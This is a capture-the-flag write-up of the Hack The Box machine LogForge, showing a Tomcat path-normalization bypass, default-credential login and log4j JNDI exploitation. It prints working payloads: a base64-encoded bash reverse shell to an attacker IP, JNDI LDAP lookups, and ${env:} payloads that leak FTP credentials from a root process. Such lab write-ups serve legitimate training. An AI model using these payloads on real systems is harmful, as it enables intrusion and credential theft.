---
created: 2025-09-30
---

📅 `2025-09-30`

#tomcat #log4j #reverse-engineering

----

## 🖥️ Box Info

| ️🏷️ Name         |   `LogForge`  |
| --------------- | --- |
| 📆 Release Date |   `2021-12-23`  |
| 🌐 IP Address   |   `10.10.11.138`  |
| 🖥️ OS           |  `Linux`   |
| 🎯 Difficulty   |   `Medium`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `Tomcat` path normalization bypass (`/..;/`) to reach the blocked manager
- `Tomcat` vulnerable to `log4j` via `jndi` through manager `POST` parameters
- Local `Java` `FTP` server vulnerable to `log4j`

**🛠️ Tools:**  

- `Burp Suite`
- `creds`
- `JNDI-Exploit-Kit` (required to exploit `log4j`)
- `jd-gui`

**📚 Learned:**  

- Download the correct version of the `jdk` in a `.tar.gz` file for the tool to work.
- `JNDI-Exploit-Kit` is easy to use, just download `jdk1.8.0_20` and run the `.jar` without arguments. We will be able to run commands dynamically if the target is vulnerable.
- If it's a `Java` app, try `log4j`.
- `log4j` payload: `${jndi:ldap://10.10.14.14:1389/...}`.
- We can get env variables of the vulnerable process with `log4j` payloads using `${env:<var>}`. e.g. `${jndi:ldap://10.10.14.14:1389/${env:<var>}}`.
- Download files from `FTP` while in a directory where we have write permissions.

----

## 🌐 Port Scan

- **TCP**: 22, 80

---

## 🔍 Enumeration

The website was only this:

![[Pasted image 20250930113333.png]]

Directory fuzzing found nothing else, and nothing hinted at subdomains. I decided to check the 404 page and compare it to the ones at [0xdf's 404 page cheatsheet](https://0xdf.gitlab.io/cheatsheets/404).

![[Pasted image 20250930113444.png]]

The web server was `Tomcat`. I enumerated for vulnerabilities and struggled to find anything. All the `Tomcat` paths were properly rejecting my requests, giving me 403 forbidden responses. However, I was sure that the foothold had something to do with `Tomcat`, so I kept trying.

I found [this cheatsheet](https://kashz.gitbook.io/kashz-jewels/services/tomcat) on pentesting `Tomcat`, which shows it can be vulnerable to path traversal with the string `/..;/`, which `Tomcat` normalizes. We use `/images/` directory as a base and go one directory up.

And it worked:

![[Pasted image 20250930113813.png]]

It's no longer 403 Forbidden; it's asking for `HTTP` basic authentication. `Burp Suite` doesn't show the prompt, so let's try it in the browser.

![[Pasted image 20250930114002.png]]

Next, I tried default credentials. I used `creds` for this.

```sh
$ creds search tomcat
+----------------------------------+------------+------------+
| Product                          |  username  |  password  |
+----------------------------------+------------+------------+
| apache tomcat host manager (web) |   ADMIN    |   ADMIN    |
| apache tomcat host manager (web) |    QCC     |  QLogic66  |
| apache tomcat host manager (web) |   admin    |  <blank>   |
| apache tomcat host manager (web) |   admin    |   admin    |
| apache tomcat host manager (web) |   admin    |   j5Brn9   |
| apache tomcat host manager (web) |   admin    |   tomcat   |
| apache tomcat host manager (web) |   cxsdk    |   kdsxc    |
| apache tomcat host manager (web) | j2deployer | j2deployer |
| apache tomcat host manager (web) |  ovwebusr  | OvW*busr1  |
| apache tomcat host manager (web) |    role    | changethis |
| apache tomcat host manager (web) |   role1    |   role1    |
| apache tomcat host manager (web) |   role1    |   tomcat   |
| apache tomcat host manager (web) |    root    |    root    |
| apache tomcat host manager (web) |   tomcat   | changethis |
| apache tomcat host manager (web) |   tomcat   |   s3cret   |
| apache tomcat host manager (web) |   tomcat   |   tomcat   |
| apache tomcat host manager (web) |   xampp    |   xampp    |
+----------------------------------+------------+------------+
```

I tried them one by one and `tomcat`:`tomcat` worked.

![[Pasted image 20250930114114.png]]

Getting a shell from the manager should be straightforward, but it wasn't. I created a `.war` reverse shell using `msfvenom` and tried to deploy it, but got this message:

![[Pasted image 20250930114543.png]]

---

## 🪜 Foothold / User

After getting a hint that the web app was vulnerable to `log4j`, I spent a long time trying different tools to turn it into a shell. The approach that worked, based on Ippsec's video on this box, uses `JNDI-Exploit-Kit` together with a modified version of `ysoserial`, which serializes the payload so it doesn't get blocked. I cloned both repos.

```shell
$ git clone https://github.com/pimps/ysoserial-modified.git
$ git clone https://github.com/pimps/JNDI-Exploit-Kit.git
```

>[!tip]
>I had to download a `.gz` file of `jdk 1.8.0_20` for `JNDI-Exploit-Kit` to run.

Let's run the server.

```shell
# Without the -P option because we won't run a payload from a file
./jdk1.8.0_20/bin/java -jar JNDI-Exploit-Kit.jar
```

Instead of using a serialized payload, I used the kit's built-in command execution. The tool says we can run a command dynamically on the server using this request:

```
ldap://10.10.14.14:1389/serial/[payload_name]/exec_unix/[base64_command]
```

I `base64`-encoded this payload: `/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1'` and made the request in `Burp Suite`.

![[Pasted image 20250930142432.png]]

```
idle=${jndi:ldap://10.10.14.14:1389/serial/CommonsCollections5/exec_unix/L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0LzEyMzQgMD4mMSc=}
```

And...

![[Pasted image 20250930142510.png|600]]

We are user `tomcat`. This user can read `/home/htb`, which has the user flag.

---

## 🛡️ Privilege Escalation

Enumerating the system I found a strange file `/ftpServer-1.0-SNAPSHOT-all.jar`. Using `netstat -punta` I found that there was an `FTP` server running on the machine. Since it's a `Java` app, I tried `log4j`. I started a simple `netcat` listener on port 9001 and got a response.

```shell
tomcat@LogForge:/$ ftp 127.0.0.1
Connected to 127.0.0.1.
220 Welcome to the FTP-Server
Name (127.0.0.1:tomcat): ${jndi:ldap://10.10.14.14:9001}
```

On the listener:

```shell
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.138:52996.
```

So the `FTP` server is vulnerable to `log4j`. This had to be the path. I saw through `ps aux` that the `FTP` server was running as root. I could have injected a command like before, but I decompiled the program first. I used `jd-gui` since it's `Java`.

After looking at the source code for a few minutes I noticed this:

![[Pasted image 20250930190629.png]]

The credentials are environment variables of the server process, meaning I can try to extract them using the `log4j` vulnerability. We just use `${env:<var>}` in the payload's path.

Example payload:

```
${jndi:ldap://10.10.14.14:1389/${env:ftp_user}}
```

Start the `JNDI-Exploit-Kit` server and try the payloads:

```shell
./jdk1.8.0_20/bin/java -jar JNDI-Exploit-Kit.jar
```

Payloads:

```shell
tomcat@LogForge:/$ ftp 127.0.0.1
Connected to 127.0.0.1.
220 Welcome to the FTP-Server
Name (127.0.0.1:tomcat): ${jndi:ldap://10.10.14.14:1389/${env:ftp_user}}

tomcat@LogForge:/$ ftp 127.0.0.1
Connected to 127.0.0.1.
220 Welcome to the FTP-Server
Name (127.0.0.1:tomcat): ${jndi:ldap://10.10.14.14:1389/${env:ftp_password}}
```

Output from the server:

```shell
----------------------------Server Log----------------------------
2025-09-30 19:00:00 [JETTYSERVER]>> Listening on 10.10.14.14:8180
2025-09-30 19:00:00 [RMISERVER]  >> Listening on 10.10.14.14:1099
2025-09-30 19:00:00 [LDAPSERVER] >> Listening on 0.0.0.0:1389
2025-09-30 19:00:06 [LDAPSERVER] >> Reference that matches the name(ippsec) is not found.
2025-09-30 19:00:06 [LDAPSERVER] >> Reference that matches the name(ippsec) is not found.
2025-09-30 19:08:33 [LDAPSERVER] >> Reference that matches the name(log4j_env_leakage) is not found.
2025-09-30 19:08:33 [LDAPSERVER] >> Reference that matches the name(log4j_env_leakage) is not found.
```

The output contains the credentials:

- `ippsec`:`log4j_env_leakage`

These should be the credentials for the `FTP` server. The password didn't work with `su -`.

```shell
ftp> ls
200 Command OK
125 Opening ASCII mode data connection for file list.
.profile
.ssh
snap
ftpServer-1.0-SNAPSHOT-all.jar
.bashrc
.selected_editor
run.sh
.lesshst
.bash_history
root.txt
.viminfo
.cache
226 Transfer complete.
```

It looks like we are in `/root`. I grabbed the flag (running this from `/tmp/`).

>[!tip]
>I had permission problems getting the file because I was in `/`.

```shell
ftp> get root.txt
local: root.txt remote: root.txt
200 Command OK
150 Opening ASCII mode data connection for requested file root.txt
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
33 bytes received in 0.00 secs (503.5400 kB/s)

ftp> exit
221 Closing connection

tomcat@LogForge:/tmp$ ls
hsperfdata_tomcat  root.txt  tmux-997

tomcat@LogForge:/tmp$ ls -l
total 4
drwxr-x--- 1 tomcat tomcat  6 Sep 30 05:44 hsperfdata_tomcat
-rw-r----- 1 tomcat tomcat 33 Oct  1 00:13 root.txt
drwx------ 1 tomcat tomcat  0 Sep 30 22:52 tmux-997
```

Rooted.
